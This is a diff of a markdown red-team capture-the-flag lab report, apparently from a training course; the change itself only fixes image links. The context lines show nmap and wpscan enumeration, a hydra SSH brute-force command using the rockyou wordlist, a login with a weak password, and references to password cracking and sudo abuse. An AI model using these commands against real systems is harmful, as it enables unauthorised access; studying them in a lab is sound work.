@@ -14,7 +14,7 @@ Nmap scan results for each machine reveal the below services and OS details:
 $ nmap -sV 192.168.1.110
   
 ```
-![./images/nmap_scan.png]
+![npmap_scan](images/nmap_scan.png)
 
 This scan identifies the services below as potential points of entry:
 - Target 1
@@ -47,14 +47,14 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - Target 1
   - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
   **Flag1: b9bbcb33ellb80be759c4e844862482d**
-  ![./images/flag1.png]
+  ![flag1](images/flag1.png)
     - **Exploit Used**
       - _TODO: Identify the exploit used_
       WPSCAN Enumeration / HydraBruteForce
       - _TODO: Include the command run_
         - `$ wpscan --url http://192.168.1.110 --enumerate u`
           -`hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh`
-          ![./images/hydra_michael.png]
+          ![hydra_michael](images/hydra_michael.png)
         - `ssh michael@192.168.1.110`
         - `pw: michael`
         - `cd ../../var/www/html`
@@ -63,7 +63,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
   **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
-  ![./images/flag2.png]
+  ![flag2](images/flag2.png)
     - **Exploit Used**
       - _TODO: Identify the exploit used_
       Directory Exploration
@@ -77,7 +77,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag3.txt`: _TODO: Insert `flag3.txt` hash value_  
   **Flag3: afc01ab56b50591e7dccf93122770cd2**
-  ![./images/flag3.png]
+  ![flag3](images/flag3.png)
       - _TODO: Identify the exploit used_
       Directory Exploration -> Database Access -> Database Exploration
       - _TODO: Include the command run_
@@ -90,7 +90,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag4.txt`: _TODO: Insert `flag4.txt` hash value_
   **Flag4: 715dea6c055b9fe3337544932f2941ce**
-  ![./images/flag4.png]
+  ![flag4](images/flag4.png)
       - _TODO: Identify the exploit used_
       JohnTheRipper / sudo privilege abuse
       - _TODO: Include the command run_
